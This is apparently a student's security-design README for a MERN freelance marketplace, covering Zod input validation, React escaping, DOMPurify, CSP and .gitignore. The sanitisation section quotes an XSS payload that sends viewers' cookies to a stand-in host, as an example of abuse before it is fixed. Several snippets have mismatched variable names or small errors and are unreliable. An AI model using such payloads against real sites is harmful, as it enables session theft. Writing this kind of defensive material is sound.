# insy7314-2026-g1-insy7314-2026-hustlehub-plus-part1-st10286905


# Architecture 

The HustleHub+ system is a freelance marketplace platform that facilitates the advertisement and browsing of listed services. The system processes sensitive personable identifiable and financial information related to the booking of services. This make it imperative that the system be designed and implemented in a security conscious manner to proactively mitigate and prevent attack vectors that could be leveraged to compromise its integrity. 

The design of the system and implementation follows the MERN architecture and is comprised of the following components: 

- MongoDB - document database 
- Express(.js) - Node.js web framework 
- React(.js) - Front-end JavaScript framework
- Node(.js) - JavaScript web server (runtime)

The below diagram visualises the MERN architecture at a high-level without representation of security considerations. 

<img width="542" height="512" alt="Untitled Diagram drawio" src="https://github.com/user-attachments/assets/c50d2755-c66a-44a4-975c-474dc8f3272c" />

## Architecture diagram 

```mermaid 
architecture-beta
    group client[Client Layer - React frontend]
    group network[Network Security Layer]
    group server[Server Layer - Node/Express backend]
    group db[Database Layer - MongoDB]

    service ui(logos:react)[React UI Components] in client
    service rhf(lucide:form-input)[React Hook Form Context] in client
    service zod_front(lucide:file-check-2)[Zod Frontend Schemas] in client
    service axios(lucide:arrow-left-right)[Axios / Fetch Client] in client

    service tls(lucide:shield-check)[HTTPS / TLS Encryption] in network

    service helmet(lucide:hard-hat)[Helmet.js Middleware] in server
    service core_logic(logos:nodejs)[Express Controllers] in server
    service mongoose(lucide:layers)[Mongoose ODM] in server

    service mongo_db(logos:mongodb-icon)[MongoDB Cluster] in db

    ui:R -- L:rhf
    rhf:R -- L:zod_front
    rhf:B -- T:axios

    axios:B -- T:tls
    tls:B -- T:helmet

    helmet:B -- T:core_logic

    core_logic:B -- T:mongoose
    mongoose:B -- T:mongo_db
```

# System Security 

The security considerations revolve around cross-site scripting, structure query language (SQL) injection 

## Client-side Input validation

Input validation was a security consideration that will be implemented in the React front-end and acts as the first preventative security layer that stops malformed or malicious input/requests from reaching the server. However, it should be noted that client-side validation can be trivially bypassed, therefore it remains crucial to implement server-side validation and santisation of requests.

### Type checking 

Type checking ensures that input fields submitted matches the exact primitive or data structure expected. This will be implemented in the Client-side application (React) using Zod to enforce primitives/data structures before submission.

The following will be validated using a type checking using Zod defined schema for each primary entity within the HustleHub+ system: 
#### User Entity Schema

```javascript
export const UserTypeSchema = z.object({
  id: z.string(),
  email: z.string(),
  password: z.string(),
  is_active: z.boolean(),
  is_verified: z.boolean(),
});
```

#### Freelancer Profile Entity Schema

```javascript
export const FreelancerProfileTypeSchema = z.object({
  user_id: z.string(),
  first_name: z.string(),
  last_name: z.string(),
  bio: z.string(),
  phone_number: z.string(),
  hourly_rate: z.number(),
  skills: z.array(z.string()),
});
```

#### Service Entity Schema

```javascript
export const ServiceTypeSchema = z.object({
  id: z.string(),
  freelancer_id: z.string(),
  title: z.string(),
  description: z.string(),
  base_price: z.number(),
  category: z.string(),
});
```

#### Booking Entity Schema

```javascript
export const BookingTypeSchema = z.object({
  id: z.string(),
  client_id: z.string(),
  service_id: z.string(),
  scheduled_start: z.string(),
  scheduled_end: z.string(),
  status: z.string(),
  requirements_note: z.string().optional(),
});
```

#### Transaction Entity Schema

```javascript
export const TransactionTypeSchema = z.object({
  id: z.string(),
  booking_id: z.string(),
  amount: z.number(),
  currency: z.string(),
  payment_gateway_reference: z.string(),
});
```

### Length Limits 

Length limits ensure that user submitted input conforms to a pre-defined length before submission to the server. The restriction of the input length supports the mitigation of denial of service attack that leverage large inputs to reduce system responsiveness. This will be implemented in the Client-side application (React) using Zod. 

The below Zod entity schema have been revised to showcase how the length limitations will be implemented in the validation of client-side inputs related to primary entities within the system: 
#### User Entity Schema

```javascript
export const UserLengthSchema = z.object({
  id: z.string(),
  email: z.string()
    .min(5, { message: "Email must be at least 5 characters" })
    .max(254, { message: "Email cannot exceed 254 characters" }),
  password: z.string()
    .min(12, { message: "Password must be at least 12 characters" })
    .max(72, { message: "Password cannot exceed 72 characters" }),
  is_active: z.boolean(),
  is_verified: z.boolean(),
});
```

#### Freelancer Profile Entity Schema

```javascript
export const FreelancerProfileLengthSchema = z.object({
  user_id: z.string(),
  first_name: z.string()
    .min(1, { message: "First name is required" })
    .max(50, { message: "First name cannot exceed 50 characters" }),
  last_name: z.string()
    .min(1, { message: "Last name is required" })
    .max(50, { message: "Last name cannot exceed 50 characters" }),
  bio: z.string()
    .max(1000, { message: "Bio cannot exceed 1000 characters" }),
  phone_number: z.string()
    .min(7, { message: "Phone number must be at least 7 characters" })
    .max(15, { message: "Phone number cannot exceed 15 characters" }),
  hourly_rate: z.number(),
  skills: z.array(z.string().min(1)),
});
```
#### Service Entity Schema

```javascript
export const ServiceLengthSchema = z.object({
  id: z.string(),
  freelancer_id: z.string(),
  title: z.string()
    .min(10, { message: "Title must be at least 10 characters" })
    .max(100, { message: "Title cannot exceed 100 characters" }),
  description: z.string()
    .min(50, { message: "Description must be at least 50 characters" })
    .max(2000, { message: "Description cannot exceed 2000 characters" }),
  base_price: z.number(),
  category: z.string(),
});
```

#### Booking Entity Schema

```javascript
export const BookingLengthSchema = z.object({
  id: z.string(),
  client_id: z.string(),
  service_id: z.string(),
  scheduled_start: z.string(),
  scheduled_end: z.string(),
  status: z.string(),
  requirements_note: z.string()
    .max(500, { message: "Requirements note cannot exceed 500 characters" })
    .optional(),
});
```

#### Transaction Entity Schema

```javascript
export const TransactionLengthSchema = z.object({
  id: z.string(),
  booking_id: z.string(),
  amount: z.number(),
  currency: z.string()
    .length(3, { message: "Currency must be exactly 3 characters" }),
  payment_gateway_reference: z.string()
    .min(10, { message: "Gateway reference must be at least 10 characters" })
    .max(128, { message: "Gateway reference cannot exceed 128 characters" }),
});
```

### Format constraints 

Format constraint in terms of client-side validation refers to the process of utilising a regular expression (REGEX) to determine whether an input matches a specific pattern that constitutes valid input.  Zod has again been used for input validation using the String Formats provided by the library to implement common string format constraints on the email field of users. However, other fields such as password, phone_number have used the string primitive type with the pattern param to define a custom regex expression for validation. This provides an additional layer to client-side input validation that acts to improve the integrity of the data submitted to the server. 

The below Zod entity schema have been revised to showcase how format constraints will be implemented in the validation of client-side inputs related to primary entities within the system: 

#### User Entity Schema

```javascript
export const UserFormatSchema = z.object({
  id: z.string(),
  email: z.string().email({ message: "Must match RFC 5322 standard layout" }),
  password: z.string().regex(/(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#\$%^&*])/, {
    message: "Must include minimum character diversity (uppercase, lowercase, number, special sign)",
  }),
  is_active: z.boolean(),
  is_verified: z.boolean(),
});
```

####  Freelancer Profile Entity Schema

```javascript
export const FreelancerProfileFormatSchema = z.object({
  user_id: z.string(),
  first_name: z.string().regex(/^[A-Za-zÀ-ÿ\s'-]+\$/, { 
    message: "First name must only contain alphanumeric characters" 
  }),
  last_name: z.string().regex(/^[A-Za-zÀ-ÿ\s'-]+\$/, { 
    message: "Last name must only contain alphanumeric characters" 
  }),
  bio: z.string(),
  phone_number: z.string().regex(/^\+[1-9]\d{1,14}\$/, { 
    message: "Must adhere strictly to international E.164 configuration protocols" 
  }),
  hourly_rate: z.number().multipleOf(0.01, { 
    message: "Must be constrained to a maximum of two decimal places" 
  }),
  skills: z.array(z.string()),
});
```

--- 

### Output Escaping 

Input validation and output escaping are complementary security practices. Output escaping (or encoding) transforms data so it renders safely in the destination context (HTML, URLs, JavaScript, CSS). 

#### React Built-in HTML Escaping (Context aware escaping)

The default behaviour of React automatically HTML-escapes all JSX text and attribute values before rendering them to the Document Object Model (DOM) when utilising the curly braces `{}`. This effectively encodes dangerous characters (`<`, `>`, `&`, `"`, `'`) present in user input into HTML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`) that are safe for rendering, whereby the browser will not interpret them as markup or executable JavaScript code. 

Fundamentally, this security implementation enforces a strict separation between data which is positioned within the curly braces for encoding and markup which is inserted into JSX tags. This is achieved at render time in the `renderToString` and DOM-mount pipelines whereby the React DOM render applies context aware escaping before insert each value into the DOM, making XSS nearly impossible when rendering dynamic user generated content. 

For instance the following will be applied to the rendering dynamic user generated content such as service reviews on the platform: 

```javascript
const userReview = "<img src=x onerror='alert(1)'>";
return <div>{userComment}</div>;
```

Therefore, basic output escaping will be Incorporated by default in the client-side application. However, the default escaping provided fails to escape the output in the following cases: 

- **String attribute bindings**
- **JavaScript expressions inside `dangerouslySetInnerHTML`**
- **Event handlers from strings** 

These exceptions leave the client-application vulnerable to cross-site scripting (XSS) in the eventuality there is some failure in server-side validation that allows code/markup to be rendered within the DOM. In order to address these concerns manual santisation will be implemented, which will be discussed in greater detail later. 

--- 

### Sanitization

The default output encoding supported by React is insufficient in circumstances where the system requires raw HTML to be rendered to the DOM. The React API exposes `dangerouslySetInnerHTML` that enables an element's innerHTML property to be set directly bypassing the default HTML encoding mentioned above. However, in the context of the system the rendering of HTML content might be completely justified for freelancers creating service listings using Rich-text editors for purposes of formatting the content of their listing.  

However, when you pass unsanitized user input to `dangerouslySetInnerHTML`, you enable arbitrary code execution. Therefore santisation is necessary to mitigate the ACE vulnerability presented through the use of this API. The below code snippet exemplifies how `dangerouslySetInnerHTML` can be abused: 

```javascript
function ServiceListingDisplay({ serviceListing }) {
  // UNSAFE: serviceListing might contain <script> tags or event handlers
  // serviceListing = '<img src=x onerror="fetch("https://hostname/" + document.cookies)">'
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
}
```

Upon failure to render the image the `onerror` event will fire executing the specified JavaScript payload. In the above example this will ex-filtrate the cookies of the user that views the service listing to the threat actors infrastructure. 

#### DOMPurify 

Santisation of the user specified service listing HTML will be achieved using DOMPurify an industry standard sanitization library. DomPurify removes event handlers, script tags and returns a safe subset of HTML elements that can be rendered in the DOM without the possibility of introducing ACE vulnerabilities. The below example, showcases how DOMPurify will be implemented in the client to mitigate the risk associated with the `dangerouslySetInnerHTML` API: 

```javascript
function CommentDisplay({ userComment }) {
  const clean = DOMPurify.sanitize(userComment);
// serviceListing = '<img src=x onerror="fetch("https://hostname/" + document.cookies)">'
// DOMPurify removes the onerror attribute and returns:
// '<img src="x">'
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

Furthermore, a whitelist will be defined in DOMPurify to control the type of formatting allowed for service listings. This enables fine -grained control to be exercised over the elements that a user can provide for rendering on the DOM. The below implementation, showcases how this may be designed in the eventuality that style tags, script tags and event tags are prohibited: 

```javascript 
function DisplayServiceListing ({ serviceListingHTML }) {
  const config = {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_UNKNOWN_PROTOCOLS: false,
  };
  
  const clean = DOMPurify.sanitize(serviceListingHTML, config);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

However, it should be noted that DOMPurify cannot be relied upon exclusively to remove all XSS attack vectors and will be paired with a Content Security Policy (CSP) to improve the robustness of the system's security. Lastly, despite the implementation of back-end santisation, the network should never be trusted. Therefore, sanitisation will always occur in the React client to mitigate circumstances whereby the HTML might be modified by a proxy or intercepted during transmission before being rendered on the client. 

---

### Content Security Policy (CSP)

Content Security Policy (CSP) is an HTTP header that instructs the browser to block certain code origins, mitigating code injection attacks, such as XSS. Even if an attacker injects malicious HTML like `<img src=x onerror="alert(1)">`, CSP can prevent the script from executing by restricting what sources the browser trusts. The CSP is defined in the server's configuration and sent upon a client request as a CSP HTTP header. The user's browser validates every resource against the policy defined in the header before rendering and subsequently execution. Upon violation of the policy the browser will block the resource preventing its execution.

The CSP of the system will be defined as follows: 

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-{NONCE}' https://trusted-cdn.com; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:; 
  connect-src 'self' https://hustle.com; 
  frame-src 'none'; 
  object-src 'none'; 
  base-uri 'self'; 
  form-action 'self'; 
  upgrade-insecure-requests;
```

- `default-src 'self'`: Only load resources from the same origin.
- `script-src 'self' 'nonce-{NONCE}'`: Allow scripts from the same origin and inline scripts with a specific nonce.
- `style-src 'self' 'unsafe-inline'`: Allow styles from the same origin and React components that use inline styles.
- `img-src 'self' data: https:`: Allow images from same origin, data URLs, and any HTTPS URL.
- `connect-src 'self' https://api.example.com`: Allow fetch/XHR only to same origin.
- `frame-src 'none'`: Block all iframes (preventing click fixing from occuring).
- `object-src 'none'`: Block `<object>` and `<embed>` tags.
- `base-uri 'self'`: Prevent scripts from changing the page's base URL.
- `form-action 'self'`: Forms can only submit to the same origin.
- `upgrade-insecure-requests`: Upgrade HTTP resources to HTTPS automatically.


## Middleware 

- How request will be intercepted by the middle ware 
- Global exception handler (https://expressjs.com/en/guide/error-handling/#the-default-error-handler)
- Rate limiting 
- SQL injection (paramaterised queries)

## Secure Communication Protocol
- Https 
- TLS

## GitHub ignore 

The use of a `.gitignore` file is not considered a security mechanism as those mentioned above, however it serves as a security consideration to prevent connection strings and environmental variables defined in the `.env` file from being committed to the source control of the system. By ensuring these credentials remain strictly local, it mitigates the risk of credential exposure and unauthorised access in the event that the system's repository or source code is ever compromised.

Below showcases the implementation of the `.gitignore` file utilised in the Express server API: 

```
# npm
node_modules
*.log
*.gz

# Yarn
yarn-error.log
yarn.lock

# Coveralls
.nyc_output
coverage

# Benchmarking
benchmarks/graphs

# Environments and Secrets 
.env 
```

**`.env`**: Blocks the main local environment file where you store your actual connection strings and API keys. The rest of the excludes are included primary to prevent the inclusion of unnecessary logging data (`*.log`, `*.gz`) and external dependencies (`node_modules`) that will bloat the size of the repository. 

## Security Headers 

## JWT Authentication 

- Hashing 
- HttpOnly cookies 
- Non-default session cookie name 
- Cookie security options 

- Token refreshing/extension 
- Logout/revocation tokens 



https://expressjs.com/en/advanced/best-practice-security/
https://reactz2h.com/chapter_12_frontend_security_for_react/series_02_auth_tokens_and_session_security/httponly_cookies_secure_storage
